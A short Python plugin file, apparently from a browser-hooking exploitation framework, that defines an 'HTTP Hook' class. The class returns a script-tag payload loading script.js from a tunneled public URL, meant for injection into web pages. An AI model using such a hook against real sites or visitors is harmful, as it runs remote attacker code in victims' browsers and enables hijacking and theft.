from src.api.hooks import BaseHook


class Hook(BaseHook):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Default HTTP hook, uses script src.'
    NAME = 'HTTP Hook'
    VERSION = '0.1'
    TRANSPORT = 'http'

    def __init__(self):
        self._public_url = None

    async def on_launched(self, environment):
        self._public_url = environment.settings.tunneling.public_url

    @property
    def hook(self) -> str:
        return f"<script src='{self._public_url}/script.js'></script>"
